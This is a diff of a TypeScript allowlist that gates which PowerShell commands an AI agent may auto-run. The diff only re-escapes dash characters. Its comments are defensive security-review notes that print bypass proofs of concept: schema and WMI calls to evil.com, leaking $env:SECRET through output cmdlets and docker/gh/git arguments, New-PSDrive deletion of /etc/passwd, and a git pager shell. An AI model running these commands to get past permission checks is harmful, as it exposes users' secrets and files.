@@ -63,11 +63,11 @@ type CommandConfig = {
  * to System.Double"). Bash's echo regex WHITELISTS safe chars per token.
  *
  * Two checks:
- * 1. elementTypes whitelist — StringConstant (literals) + Parameter (flag
+ * 1. elementTypes whitelist \u2014 StringConstant (literals) + Parameter (flag
  *    names). Rejects Variable, Other (HashtableAst/ConvertExpressionAst/
  *    BinaryExpressionAst all map to Other), ScriptBlock, SubExpression,
  *    ExpandableString. Same pattern as SAFE_PATH_ELEMENT_TYPES.
- * 2. Colon-bound parameter value — `-InputObject:$env:SECRET` creates a
+ * 2. Colon-bound parameter value \u2014 `-InputObject:$env:SECRET` creates a
  *    SINGLE CommandParameterAst; the VariableExpressionAst is its .Argument
  *    child, not a separate CommandElement. elementTypes = [..., 'Parameter'],
  *    whitelist passes. Query children[] for the .Argument's mapped type;
@@ -83,7 +83,7 @@ export function argLeaksValue(
   const children = element?.children
   for (let i = 0; i < argTypes.length; i++) {
     if (argTypes[i] !== 'StringConstant' && argTypes[i] !== 'Parameter') {
-      // ArrayLiteralAst (`Select-Object Name, Id`) maps to 'Other' — the
+      // ArrayLiteralAst (`Select-Object Name, Id`) maps to 'Other' \u2014 the
       // parse script only populates children for CommandParameterAst.Argument,
       // so we can't inspect elements. Fall back to string-archaeology on the
       // extent text: Hashtable has `@{`, ParenExpr has `(`, variables have
@@ -122,7 +122,7 @@ export function argLeaksValue(
  * Note: PowerShell cmdlets are case-insensitive, so we store keys in lowercase
  * and normalize input for matching.
  *
- * Uses Object.create(null) to prevent prototype-chain pollution — attacker-
+ * Uses Object.create(null) to prevent prototype-chain pollution \u2014 attacker-
  * controlled command names like 'constructor' or '__proto__' must return
  * undefined, not inherited Object.prototype properties. Same defense as
  * COMMON_ALIASES in parser.ts.
@@ -338,7 +338,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
       ],
     },
     // SECURITY: Test-Json REMOVED. -Schema (positional 1) accepts JSON Schema
-    // with $ref pointing to external URLs — Test-Json fetches them (network
+    // with $ref pointing to external URLs \u2014 Test-Json fetches them (network
     // request). safeFlags only validates EXPLICIT flags, not positional binding:
     // `Test-Json '{}' '{"$ref":"http://evil.com"}'` \u2192 position 1 binds to
     // -Schema \u2192 safeFlags check sees two non-flag args, skips both \u2192 auto-allow.
@@ -486,7 +486,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
       additionalCommandIsDangerousCallback: argLeaksValue,
     },
     // Write-Host bypasses the pipeline (Information stream, PS5+), so it's
-    // strictly less capable than Write-Output — but the same
+    // strictly less capable than Write-Output \u2014 but the same
     // `Write-Host $env:SECRET` leak-via-display applies.
     'write-host': {
       safeFlags: [
@@ -499,7 +499,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
       additionalCommandIsDangerousCallback: argLeaksValue,
     },
     // Bash parity: `sleep` is in READONLY_COMMANDS (BashTool
-    // readOnlyValidation.ts:~1146). Zero side effects at runtime — but
+    // readOnlyValidation.ts:~1146). Zero side effects at runtime \u2014 but
     // `Start-Sleep $env:SECRET` leaks via type-coerce error. Same guard.
     'start-sleep': {
       safeFlags: ['-Seconds', '-Milliseconds', '-Duration'],
@@ -507,7 +507,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     },
     // Format-* and Measure-Object moved here from SAFE_OUTPUT_CMDLETS after
     // security review found all accept calculated-property hashtables (same
-    // exploit as Where-Object — I4 regression). isSafeOutputCommand is a
+    // exploit as Where-Object \u2014 I4 regression). isSafeOutputCommand is a
     // NAME-ONLY check that filtered them out of the approval loop BEFORE arg
     // validation. Here, argLeaksValue validates args:
     //   | Format-Table               \u2192 no args \u2192 safe \u2192 allow
@@ -518,7 +518,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     // allowAllFlags: argLeaksValue validates arg elementTypes (Variable/Hashtable/
     // ScriptBlock \u2192 blocked). Format-* flags themselves (-AutoSize, -GroupBy,
     // -Wrap, etc.) are display-only. Without allowAllFlags, the empty-safeFlags
-    // default rejects ALL flags — `Format-Table -AutoSize` would over-prompt.
+    // default rejects ALL flags \u2014 `Format-Table -AutoSize` would over-prompt.
     'format-table': {
       allowAllFlags: true,
       additionalCommandIsDangerousCallback: argLeaksValue,
@@ -546,7 +546,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     // them identically: StringConstant property names pass (`Select-Object Name`),
     // HashtableAst/ScriptBlock/Variable args block (`Select-Object @{N='x';E={...}}`,
     // `Where-Object { ... }`). allowAllFlags: -First/-Last/-Skip/-Descending/
-    // -Property/-EQ etc. are all selection/ordering flags — harmless on their own;
+    // -Property/-EQ etc. are all selection/ordering flags \u2014 harmless on their own;
     // argLeaksValue catches the dangerous arg *values*.
     'select-object': {
       allowAllFlags: true,
@@ -564,7 +564,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
       allowAllFlags: true,
       additionalCommandIsDangerousCallback: argLeaksValue,
     },
-    // Out-String/Out-Host moved here from SAFE_OUTPUT_CMDLETS — both accept
+    // Out-String/Out-Host moved here from SAFE_OUTPUT_CMDLETS \u2014 both accept
     // -InputObject which leaks the same way Write-Output does.
     // `Get-Process | Out-String -InputObject $env:SECRET` \u2192 secret prints.
     // allowAllFlags: -Width/-Stream/-Paging/-NoNewline are display flags;
@@ -667,7 +667,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     //   PoC: Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
     //   \u2192 sends ICMP to evil.com (DNS leak + potential NTLM auth leak).
     // WMI can also auto-load provider DLLs (init code). Removal forces prompt.
-    // get-cimclass stays — only lists class metadata, no instance enumeration.
+    // get-cimclass stays \u2014 only lists class metadata, no instance enumeration.
     'get-cimclass': {
       safeFlags: [
         '-ClassName',
@@ -699,7 +699,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     ipconfig: {
       // SECURITY: On macOS, `ipconfig set <iface> <mode>` configures network
       // (writes system config). safeFlags only validates FLAGS, positional args
-      // are SKIPPED. Reject any positional argument — only bare `ipconfig` or
+      // are SKIPPED. Reject any positional argument \u2014 only bare `ipconfig` or
       // `ipconfig /all` (read-only display) allowed. Windows ipconfig only uses
       // /flags (display), macOS ipconfig uses subcommands (get/set/waitall).
       safeFlags: ['/all', '/displaydns', '/allcompartments'],
@@ -751,7 +751,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         _cmd: string,
         element?: ParsedCommandElement,
       ) => {
-        // Reject any positional (non-flag) argument — sets hostname.
+        // Reject any positional (non-flag) argument \u2014 sets hostname.
         return (element?.args ?? []).some(a => !a.startsWith('-'))
       },
     },
@@ -783,7 +783,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         // The first non-flag positional is the verb. `route add 10.0.0.0 mask
         // 255.0.0.0 192.168.1.1 print` adds a route (print is a trailing display
         // modifier). The old check used args.some('print') which matched 'print'
-        // anywhere — position-insensitive.
+        // anywhere \u2014 position-insensitive.
         if (!element) {
           return true
         }
@@ -797,7 +797,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     // (`netsh interface ipv4 show addresses`), dual-prefix flags (-f / /f),
     // script execution via -f and `exec`, remote RPC via -r, offline-mode
     // commit, wlan connect/disconnect, etc. Each denylist expansion revealed
-    // another gap. `route` stays — `route print` is the only read-only form,
+    // another gap. `route` stays \u2014 `route print` is the only read-only form,
     // simple single-verb-position grammar.
     getmac: {
       safeFlags: ['/FO', '/NH', '/V'],
@@ -876,7 +876,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     dotnet: {},
 
     // SECURITY: man and help direct entries REMOVED. They aliased Get-Help
-    // (also removed — see above). Without these entries, lookupAllowlist
+    // (also removed \u2014 see above). Without these entries, lookupAllowlist
     // resolves via COMMON_ALIASES to 'get-help' which is not in allowlist \u2192
     // prompt. Same module-autoload hazard as Get-Help.
   },
@@ -888,29 +888,29 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
  */
 const SAFE_OUTPUT_CMDLETS = new Set([
   'out-null',
-  // NOT out-string/out-host — both accept -InputObject which leaks args the
+  // NOT out-string/out-host \u2014 both accept -InputObject which leaks args the
   // same way Write-Output does. Moved to CMDLET_ALLOWLIST with argLeaksValue.
-  // `Get-Process | Out-String -InputObject $env:SECRET` — Out-String was
+  // `Get-Process | Out-String -InputObject $env:SECRET` \u2014 Out-String was
   // filtered name-only, the $env arg was never validated.
   // out-null stays: it discards everything, no -InputObject leak.
   // NOT foreach-object / where-object / select-object / sort-object /
   // group-object / format-table / format-list / format-wide / format-custom /
-  // measure-object — ALL accept calculated-property hashtables or script-block
+  // measure-object \u2014 ALL accept calculated-property hashtables or script-block
   // predicates that evaluate arbitrary expressions at runtime
   // (about_Calculated_Properties). Examples:
-  //   Where-Object @{k=$env:SECRET}       — HashtableAst arg, 'Other' elementType
-  //   Select-Object @{N='x';E={...}}      — calculated property scriptblock
-  //   Format-Table $env:SECRET            — positional -Property, prints as header
-  //   Measure-Object -Property $env:SECRET — leaks via "property 'sk-...' not found"
-  //   ForEach-Object { $env:PATH='e' }    — arbitrary script body
-  // isSafeOutputCommand is a NAME-ONLY check — step-5 filters these out of
+  //   Where-Object @{k=$env:SECRET}       \u2014 HashtableAst arg, 'Other' elementType
+  //   Select-Object @{N='x';E={...}}      \u2014 calculated property scriptblock
+  //   Format-Table $env:SECRET            \u2014 positional -Property, prints as header
+  //   Measure-Object -Property $env:SECRET \u2014 leaks via "property 'sk-...' not found"
+  //   ForEach-Object { $env:PATH='e' }    \u2014 arbitrary script body
+  // isSafeOutputCommand is a NAME-ONLY check \u2014 step-5 filters these out of
   // the approval loop BEFORE arg validation runs. With them here, an
   // all-safe-output tail auto-allows on empty subCommands regardless of
   // what the arg contains. Removing them forces the tail through arg-level
   // validation (hashtable is 'Other' elementType \u2192 fails the whitelist at
   // isAllowlistedCommand \u2192 ask; bare $var is 'Variable' \u2192 same).
   //
-  // NOT write-output — pipeline-initial $env:VAR is a VariableExpressionAst,
+  // NOT write-output \u2014 pipeline-initial $env:VAR is a VariableExpressionAst,
   // skipped by getSubCommandsForPermissionCheck (non-CommandAst). With
   // write-output here, `$env:SECRET | Write-Output` \u2192 WO filtered as
   // safe-output \u2192 empty subCommands \u2192 auto-allow \u2192 secret prints. The
@@ -925,7 +925,7 @@ const SAFE_OUTPUT_CMDLETS = new Set([
  * blocks calculated-property hashtables / scriptblocks / variable args).
  *
  * Used by isAllowlistedPipelineTail for the narrow fallback in
- * checkPermissionMode and isReadOnlyCommand — these callers need the same
+ * checkPermissionMode and isReadOnlyCommand \u2014 these callers need the same
  * "skip harmless pipeline tail" behavior as SAFE_OUTPUT_CMDLETS but with
  * the argLeaksValue guard.
  */
@@ -950,13 +950,13 @@ const PIPELINE_TAIL_CMDLETS = new Set([
  * which the nameType gate at isAllowlistedCommand rejects before allowlist
  * lookup. That gate exists to block scripts\Get-Process \u2192 stripModulePrefix \u2192
  * cmd.name='Get-Process' spoofing. But it also catches benign PATH-resolved
- * .exe names like where.exe (bash `which` equivalent — pure read, no dangerous
+ * .exe names like where.exe (bash `which` equivalent \u2014 pure read, no dangerous
  * flags).
  *
  * SECURITY: the bypass checks the raw first token of cmd.text, NOT cmd.name.
  * stripModulePrefix collapses scripts\where.exe \u2192 cmd.name='where.exe', but
  * cmd.text preserves the raw 'scripts\where.exe ...'. Matching cmd.text's
- * first token defeats that spoofing — only a bare `where.exe` (PATH lookup)
+ * first token defeats that spoofing \u2014 only a bare `where.exe` (PATH lookup)
  * gets through.
  *
  * Each entry here MUST have a matching CMDLET_ALLOWLIST entry for flag
@@ -968,7 +968,7 @@ const SAFE_EXTERNAL_EXES = new Set(['where.exe'])
  * Windows PATHEXT extensions that PowerShell resolves via PATH lookup.
  * `git.exe`, `git.cmd`, `git.bat`, `git.com` all invoke git at runtime and
  * must resolve to the same canonical name so git-safety guards fire.
- * .ps1 is intentionally excluded — a script named git.ps1 is not the git
+ * .ps1 is intentionally excluded \u2014 a script named git.ps1 is not the git
  * binary and does not trigger git's hook mechanism.
  */
 const WINDOWS_PATHEXT = /\.(exe|cmd|bat|com)$/
@@ -978,13 +978,13 @@ const WINDOWS_PATHEXT = /\.(exe|cmd|bat|com)$/
  * Strips Windows executable extensions (.exe, .cmd, .bat, .com) from path-free
  * names so e.g. `git.exe` canonicalises to `git` and triggers git-safety
  * guards (powershellPermissions.ts hasGitSubCommand). SECURITY: only strips
- * when the name has no path separator — `scripts\git.exe` is a relative path
+ * when the name has no path separator \u2014 `scripts\git.exe` is a relative path
  * (runs a local script, not PATH-resolved git) and must NOT canonicalise to
  * `git`. Returns lowercase canonical name.
  */
 export function resolveToCanonical(name: string): string {
   let lower = name.toLowerCase()
-  // Only strip PATHEXT on bare names — paths run a specific file, not the
+  // Only strip PATHEXT on bare names \u2014 paths run a specific file, not the
   // PATH-resolved executable the guards are protecting against.
   if (!lower.includes('\\') && !lower.includes('/')) {
     lower = lower.replace(WINDOWS_PATHEXT, '')
@@ -1007,12 +1007,12 @@ export function resolveToCanonical(name: string): string {
  * 2. PSDrive-creating cmdlets: New-PSDrive (and aliases ndr, mount on Windows).
  *    Subsequent drive-prefixed paths (p:/foo) resolve via the new drive root,
  *    not via the filesystem. Finding #21: `New-PSDrive -Name p -Root /etc;
- *    Remove-Item p:/passwd` — the validator cannot know p: maps to /etc.
+ *    Remove-Item p:/passwd` \u2014 the validator cannot know p: maps to /etc.
  *
  * Any compound containing one of these cannot have its later statements'
  * relative/drive-prefixed paths validated against the stale validator cwd.
  *
- * Name kept for BashTool parity (isCwdChangingCmdlet ↔ compoundCommandHasCd);
+ * Name kept for BashTool parity (isCwdChangingCmdlet \u2194 compoundCommandHasCd);
  * semantically this is "alters path-resolution namespace".
  */
 export function isCwdChangingCmdlet(name: string): boolean {
@@ -1023,7 +1023,7 @@ export function isCwdChangingCmdlet(name: string): boolean {
     canonical === 'pop-location' ||
     // New-PSDrive creates a drive mapping that redirects <name>:/... paths
     // to an arbitrary filesystem root. Aliases ndr/mount are not in
-    // COMMON_ALIASES — check them explicitly (finding #21).
+    // COMMON_ALIASES \u2014 check them explicitly (finding #21).
     canonical === 'new-psdrive' ||
     // ndr/mount are PS aliases for New-PSDrive on Windows only. On POSIX,
     // 'mount' is the native mount(8) command; treating it as PSDrive-creating
@@ -1048,7 +1048,7 @@ export function isSafeOutputCommand(name: string): boolean {
  *
  * Narrow fallback for isSafeOutputCommand call sites that need to keep the
  * "skip harmless pipeline tail" behavior for Format-Table / Select-Object / etc.
- * Does NOT match the full CMDLET_ALLOWLIST — only the migrated transformers.
+ * Does NOT match the full CMDLET_ALLOWLIST \u2014 only the migrated transformers.
  */
 export function isAllowlistedPipelineTail(
   cmd: ParsedCommandElement,
@@ -1063,7 +1063,7 @@ export function isAllowlistedPipelineTail(
 
 /**
  * Fail-closed gate for read-only auto-allow. Returns true ONLY for a
- * PipelineAst where every element is a CommandAst — the one statement
+ * PipelineAst where every element is a CommandAst \u2014 the one statement
  * shape we can fully validate. Everything else (assignments, control
  * flow, expression sources, chain operators) defaults to false.
  *
@@ -1073,8 +1073,8 @@ export function isAllowlistedPipelineTail(
 export function isProvablySafeStatement(stmt: ParsedStatement): boolean {
   if (stmt.statementType !== 'PipelineAst') return false
   // Empty commands \u2192 vacuously passes the loop below. PowerShell's
-  // parser guarantees PipelineAst.PipelineElements ≥ 1 for valid source,
-  // but this gate is the linchpin — defend against parser/JSON edge cases.
+  // parser guarantees PipelineAst.PipelineElements \u2265 1 for valid source,
+  // but this gate is the linchpin \u2014 defend against parser/JSON edge cases.
   if (stmt.commands.length === 0) return false
   for (const cmd of stmt.commands) {
     if (cmd.elementType !== 'CommandAst') return false
@@ -1122,7 +1122,7 @@ export function hasSyncSecurityConcerns(command: string): boolean {
   }
 
   // Splatting: @variable passes arbitrary parameters. Real splatting is
-  // token-start only — `@` preceded by whitespace/separator/start, not mid-word.
+  // token-start only \u2014 `@` preceded by whitespace/separator/start, not mid-word.
   // `[^\w.]` excludes word chars and `.` so `user@example.com` (email) and
   // `file.@{u}` don't match, but ` @splat` / `;@splat` / `^@splat` do.
   if (/(?:^|[^\w.])@\w+/.test(trimmed)) {
@@ -1186,7 +1186,7 @@ export function isReadOnlyCommand(
   }
 
   const security = deriveSecurityFlags(parsed)
-  // Reject commands with script blocks — we can't verify the code inside them
+  // Reject commands with script blocks \u2014 we can't verify the code inside them
   // e.g., Get-Process | ForEach-Object { Remove-Item C:\foo } looks like a safe pipeline
   // but the script block contains destructive code
   if (
@@ -1218,7 +1218,7 @@ export function isReadOnlyCommand(
   // At runtime PowerShell cd's to ~, reads ~/.ssh/id_rsa.
   //
   // Any compound containing a cwd-changing cmdlet cannot be auto-classified
-  // read-only when other statements may use relative paths — those paths
+  // read-only when other statements may use relative paths \u2014 those paths
   // resolve differently at runtime than at validation time. BashTool has the
   // equivalent guard via compoundCommandHasCd threading into path validation.
   const totalCommands = segments.reduce(
@@ -1276,10 +1276,10 @@ export function isReadOnlyCommand(
         return false
       }
       // SECURITY: isSafeOutputCommand is name-only; only short-circuit for
-      // zero-arg invocations. Out-String -InputObject:(rm x) — the paren is
+      // zero-arg invocations. Out-String -InputObject:(rm x) \u2014 the paren is
       // evaluated when Out-String runs. With name-only check and args, the
       // colon-bound paren bypasses. Force isAllowlistedCommand (arg validation)
-      // when args present — Out-String/Out-Null/Out-Host are NOT in
+      // when args present \u2014 Out-String/Out-Null/Out-Host are NOT in
       // CMDLET_ALLOWLIST so any args will reject.
       //   PoC: Get-Process | Out-String -InputObject:(Remove-Item /tmp/x)
       //   \u2192 auto-allow \u2192 Remove-Item runs.
@@ -1295,7 +1295,7 @@ export function isReadOnlyCommand(
     // CommandAst nodes found inside script block arguments, ParenExpressionAst
     // children of colon-bound parameters, or other non-top-level positions.
     // A statement with nestedCommands is by definition not a simple read-only
-    // invocation — it contains executable sub-pipelines that bypass the
+    // invocation \u2014 it contains executable sub-pipelines that bypass the
     // per-command allowlist check above.
     if (pipeline.nestedCommands && pipeline.nestedCommands.length > 0) {
       return false
@@ -1313,7 +1313,7 @@ export function isAllowlistedCommand(
   originalCommand: string,
 ): boolean {
   // SECURITY: nameType is computed from the raw (pre-stripModulePrefix) name.
-  // 'application' means the raw name contains path chars (. \\ /) — e.g.
+  // 'application' means the raw name contains path chars (. \\ /) \u2014 e.g.
   // 'scripts\\Get-Process', './git', 'node.exe'. PowerShell resolves these as
   // file paths, not as the cmdlet/command the stripped name matches. Never
   // auto-allow: the allowlist was built for cmdlets, not arbitrary scripts.
@@ -1321,7 +1321,7 @@ export function isAllowlistedCommand(
   // classifies as 'application' (contains . and \\) and will prompt. Acceptable
   // since module-qualified names are rare in practice and prompting is safe.
   if (cmd.nameType === 'application') {
-    // Bypass for explicit safe .exe names (bash `which` parity — see
+    // Bypass for explicit safe .exe names (bash `which` parity \u2014 see
     // SAFE_EXTERNAL_EXES). SECURITY: match the raw first token of cmd.text,
     // not cmd.name. stripModulePrefix collapses scripts\where.exe \u2192
     // cmd.name='where.exe', but cmd.text preserves 'scripts\where.exe ...'.
@@ -1329,7 +1329,7 @@ export function isAllowlistedCommand(
     if (!SAFE_EXTERNAL_EXES.has(rawFirstToken)) {
       return false
     }
-    // Fall through to lookupAllowlist — CMDLET_ALLOWLIST['where.exe'] handles
+    // Fall through to lookupAllowlist \u2014 CMDLET_ALLOWLIST['where.exe'] handles
     // flag validation (empty config = all flags OK, matching bash's `which`).
   }
 
@@ -1348,7 +1348,7 @@ export function isAllowlistedCommand(
     return false
   }
 
-  // SECURITY: whitelist arg elementTypes — only StringConstant and Parameter
+  // SECURITY: whitelist arg elementTypes \u2014 only StringConstant and Parameter
   // are statically verifiable. Everything else expands/evaluates at runtime:
   //   'Variable'          \u2192 `Get-Process $env:AWS_SECRET_ACCESS_KEY` expands,
   //                         errors "Cannot find process 'sk-ant-...'", model
@@ -1363,7 +1363,7 @@ export function isAllowlistedCommand(
   // $var=/--%/::); deriveSecurityFlags has no 'Variable' case; the safeFlags
   // loop below validates flag NAMES but not positional arg TYPES. File cmdlets
   // (CMDLET_PATH_CONFIG) are already protected by SAFE_PATH_ELEMENT_TYPES in
-  // pathValidation.ts — this closes the gap for non-file cmdlets (Get-Process,
+  // pathValidation.ts \u2014 this closes the gap for non-file cmdlets (Get-Process,
   // Get-Service, Get-Command, ~15 others). PS equivalent of Bash's blanket `$`
   // token check at BashTool/readOnlyValidation.ts:~1356.
   //
@@ -1395,14 +1395,14 @@ export function isAllowlistedCommand(
         return false
       }
       // Colon-bound parameter (`-Flag:$env:SECRET`) is a SINGLE
-      // CommandParameterAst — the VariableExpressionAst is its .Argument
+      // CommandParameterAst \u2014 the VariableExpressionAst is its .Argument
       // child, not a separate CommandElement, so elementTypes says 'Parameter'
       // and the whitelist above passes.
       //
       // Query the parser's children[] tree instead of doing
       // string-archaeology on the arg text. children[i-1] holds the
       // .Argument child's mapped type (aligned with args[i-1]).
-      // Tree query catches MORE than the string check — e.g.
+      // Tree query catches MORE than the string check \u2014 e.g.
       // `-InputObject:@{k=v}` (HashtableAst \u2192 'Other', no `$` in text),
       // `-Name:('payload' > file)` (ParenExpressionAst with redirection).
       // Fallback to the extended metachar check when children is undefined
@@ -1447,14 +1447,14 @@ export function isAllowlistedCommand(
 
   // SECURITY: if allowAllFlags is set, skip flag validation (command's entire
   // flag surface is read-only). Otherwise, missing/empty safeFlags means
-  // "positional args only, reject all flags" — NOT "accept everything".
+  // "positional args only, reject all flags" \u2014 NOT "accept everything".
   if (config.allowAllFlags) {
     return true
   }
   if (!config.safeFlags || config.safeFlags.length === 0) {
     // No safeFlags defined and allowAllFlags not set: reject any flags.
     // Positional-only args are still allowed (the loop below won't fire).
-    // This is the safe default — commands must opt in to flag acceptance.
+    // This is the safe default \u2014 commands must opt in to flag acceptance.
     const hasFlags = cmd.args.some((arg, i) => {
       if (isCmdlet) {
         return isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
@@ -1471,14 +1471,14 @@ export function isAllowlistedCommand(
   // SECURITY: use elementTypes as ground
   // truth for parameter detection. PowerShell's tokenizer accepts en-dash/
   // em-dash/horizontal-bar (U+2013/2014/2015) as parameter prefixes; a raw
-  // startsWith('-') check misses `–ComputerName` (en-dash). The parser maps
+  // startsWith('-') check misses `\u2013ComputerName` (en-dash). The parser maps
   // CommandParameterAst \u2192 'Parameter' regardless of dash char.
   // elementTypes[0] is the name element; args start at elementTypes[1].
   for (let i = 0; i < cmd.args.length; i++) {
     const arg = cmd.args[i]!
     // For cmdlets: trust elementTypes (AST ground truth, catches Unicode dashes).
     // For native exes on Windows: also check `/` prefix (argv convention, not
-    // tokenizer — the parser sees `/S` as a positional, not CommandParameterAst).
+    // tokenizer \u2014 the parser sees `/S` as a positional, not CommandParameterAst).
     const isFlag = isCmdlet
       ? isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
       : arg.startsWith('-') ||
@@ -1486,7 +1486,7 @@ export function isAllowlistedCommand(
     if (isFlag) {
       // For cmdlets, normalize Unicode dash to ASCII hyphen for safeFlags
       // comparison (safeFlags entries are always written with ASCII `-`).
-      // Native-exe safeFlags are stored with `/` (e.g. '/FO') — don't touch.
+      // Native-exe safeFlags are stored with `/` (e.g. '/FO') \u2014 don't touch.
       let paramName = isCmdlet ? '-' + arg.slice(1) : arg
       const colonIndex = paramName.indexOf(':')
       if (colonIndex > 0) {
@@ -1494,12 +1494,12 @@ export function isAllowlistedCommand(
       }
 
       // -ErrorAction/-Verbose/-Debug etc. are accepted by every cmdlet via
-      // [CmdletBinding()] and only route error/warning/progress streams —
+      // [CmdletBinding()] and only route error/warning/progress streams \u2014
       // they can't make a read-only cmdlet write. pathValidation.ts already
       // merges these into its per-cmdlet param sets (line ~1339); this is
       // the same merge for safeFlags. Without it, `Get-Content file.txt
       // -ErrorAction SilentlyContinue` prompts despite Get-Content being
-      // allowlisted. Only for cmdlets — native exes don't have common params.
+      // allowlisted. Only for cmdlets \u2014 native exes don't have common params.
       const paramLower = paramName.toLowerCase()
       if (isCmdlet && COMMON_PARAMETERS.has(paramLower)) {
         continue
@@ -1563,7 +1563,7 @@ const DANGEROUS_GIT_GLOBAL_FLAGS = new Set([
 // `man git` + GIT_TRACE for git 2.51; --list-cmds is `=`-only, booleans
 // (-p/--bare/--no-*/--*-pathspecs/--html-path/etc.) advance by 1 via the
 // default path. --attr-source REMOVED: it also triggers pathspec parsing,
-// creating a second differential — moved to DANGEROUS_GIT_GLOBAL_FLAGS above.
+// creating a second differential \u2014 moved to DANGEROUS_GIT_GLOBAL_FLAGS above.
 const GIT_GLOBAL_FLAGS_WITH_VALUES = new Set([
   '-c',
   '-C',
@@ -1616,9 +1616,9 @@ function isGitSafe(args: string[]): boolean {
     // `-ccore.pager`, which isn't in DANGEROUS_GIT_GLOBAL_FLAGS. Git accepts
     // `-c<name>=<value>` and `-C<path>` with no space. We must prefix-match.
     // Note: `--cached`, `--config-env`, etc. already fail startsWith('-c') at
-    // position 1 (`-` ≠ `c`). The `!== '-'` guard only applies to `-c`
+    // position 1 (`-` \u2260 `c`). The `!== '-'` guard only applies to `-c`
     // (git config keys never start with `-`, so `-c-key` is implausible).
-    // It does NOT apply to `-C` — directory paths CAN start with `-`, so
+    // It does NOT apply to `-C` \u2014 directory paths CAN start with `-`, so
     // `git -C-trap status` must reject. `git -ccore.pager=sh log` spawns a shell.
     for (const shortFlag of DANGEROUS_GIT_SHORT_FLAGS_ATTACHED) {
       if (
@@ -1669,11 +1669,11 @@ function isGitSafe(args: string[]): boolean {
 
   const flagArgs = args.slice(idx + subcommandTokens)
 
-  // git ls-remote URL rejection — ported from BashTool's inline guard
+  // git ls-remote URL rejection \u2014 ported from BashTool's inline guard
   // (src/tools/BashTool/readOnlyValidation.ts:~962). ls-remote with a URL
   // is a data-exfiltration vector (encode secrets in hostname \u2192 DNS/HTTP).
   // Reject URL-like positionals: `://` (http/git protocols), `@` + `:` (SSH
-  // git@host:path), and `$` (variable refs — $env:URL reaches here as the
+  // git@host:path), and `$` (variable refs \u2014 $env:URL reaches here as the
   // literal string '$env:URL' when the arg's elementType is Variable; the
   // security-flag checks don't gate bare Variable positionals passed to
   // external commands).
@@ -1736,7 +1736,7 @@ function isGhSafe(args: string[]): boolean {
 
   // SECURITY: Reject any arg containing `$` (variable reference). Bare
   // VariableExpressionAst positionals reach here as literal text ($env:SECRET).
-  // deriveSecurityFlags does not gate bare Variable args — only subexpressions,
+  // deriveSecurityFlags does not gate bare Variable args \u2014 only subexpressions,
   // splatting, expandable strings, etc. All gh subcommands are network-facing,
   // so a variable arg is a data-exfiltration vector:
   //   gh search repos $env:SECRET_API_KEY
@@ -1765,11 +1765,11 @@ function isDockerSafe(args: string[]): boolean {
   // SECURITY: blanket PowerShell `$` variable rejection. Same guard as
   // isGitSafe and isGhSafe. Parser differential: validator sees literal
   // '$env:X'; PowerShell expands at runtime. Runs BEFORE the fast-path
-  // return — the previous location (after fast-path) never fired for
+  // return \u2014 the previous location (after fast-path) never fired for
   // `docker ps`/`docker images`. The earlier comment claiming those take no
   // --format was wrong: `docker ps --format $env:AWS_SECRET_ACCESS_KEY`
   // auto-allowed, PowerShell expanded, docker errored with the secret in
-  // its output, model read it. Check ALL args, not flagArgs — args[0]
+  // its output, model read it. Check ALL args, not flagArgs \u2014 args[0]
   // (subcommand slot) could also be `$env:X`. elementTypes whitelist isn't
   // applicable here: this function receives string[] (post-stringify), not
   // ParsedCommandElement; the isAllowlistedCommand caller applies the
@@ -1783,7 +1783,7 @@ function isDockerSafe(args: string[]): boolean {
   const oneWordKey = `docker ${args[0]?.toLowerCase()}`
 
   // Fast path: EXTERNAL_READONLY_COMMANDS entries ('docker ps', 'docker images')
-  // have no flag constraints — allow unconditionally (after $ guard above).
+  // have no flag constraints \u2014 allow unconditionally (after $ guard above).
   if (EXTERNAL_READONLY_COMMANDS.includes(oneWordKey)) {
     return true
   }
